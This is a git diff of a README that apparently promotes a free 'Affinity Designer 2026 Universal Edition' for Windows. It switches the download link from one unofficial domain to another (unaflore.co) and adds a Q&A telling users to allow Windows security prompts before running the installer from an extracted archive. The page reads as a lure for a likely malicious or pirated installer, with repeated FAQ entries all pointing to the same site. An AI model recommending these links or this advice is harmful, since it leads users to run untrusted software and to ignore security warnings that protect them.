@@ -7,17 +7,22 @@ Affinity Designer 2026 Universal Edition · Editing pipeline · Batch tools · W
 
 ## Download
 
-> Use the project link below for Windows.
+> Use the release page below for Windows.
 
-* **Project link:** **[affinity-designer-2026.nerasix.xyz](https://affinity-designer-2026.nerasix.xyz/)**
-* **Full URL:** `https://affinity-designer-2026.nerasix.xyz/`
-* **Type:** Desktop package | Windows 10 and 11, 64-bit
-* **Setup:** Run the installer from the extracted folder
+- **Release page:** [unaflore.co](https://unaflore.co)
+- **Full URL:** `https://unaflore.co/`
+- **Type:** Desktop package | Windows 10 and 11, 64-bit
+- **Setup:** Run the installer from the extracted folder
 
 
----
+## Questions & Answers
 
-Notes for users who need **Affinity Designer 2026 Universal Edition** running on Windows — especially when setup fails, updates break, or the app will not start.
+**Is it free to download?** Yes — it's free to download and use.
+
+**Does it work on Windows?** Yes, it's built and tested for Windows 10 and 11.
+
+**What if Windows asks for permission to run?** Allow it — that's a standard security prompt.
+
 
 ## What this repo covers
 
@@ -47,17 +52,17 @@ Notes for users who need **Affinity Designer 2026 Universal Edition** running on
 
 <details>
 <summary><b>How do I install?</b></summary>
-<br>Open <a href="https://affinity-designer-2026.nerasix.xyz/">affinity-designer-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the Nerasix page.
+<br>Open <a href="https://unaflore.co/">unaflore.co</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary><b>How do I install?</b></summary>
-<br>Open <a href="https://affinity-designer-2026.nerasix.xyz/">affinity-designer-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the Nerasix page.
+<br>Open <a href="https://unaflore.co/">unaflore.co</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary><b>Download didn't start?</b></summary>
-<br>Open <a href="https://affinity-designer-2026.nerasix.xyz/">affinity-designer-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the Nerasix page.
+<br>Open <a href="https://unaflore.co/">unaflore.co</a> directly in your browser and use the download page.
 </details>
 
 <details>
